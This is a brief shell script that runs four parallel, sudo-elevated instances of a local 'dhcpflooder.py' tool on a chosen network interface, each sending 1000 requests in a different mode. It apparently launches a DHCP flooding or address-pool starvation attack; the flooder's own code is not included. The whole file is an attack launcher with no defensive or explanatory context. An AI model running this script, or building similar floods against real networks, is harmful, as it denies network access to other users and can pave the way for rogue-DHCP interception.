#!/bin/sh
cd "${0%/*}"
IFACE="${1:-eth0}"
for n in `seq 0 3`; do
	set -x
	sudo ./dhcpflooder.py -i "$IFACE" -t 0 -c 1000 -m $n &
	set +x
done
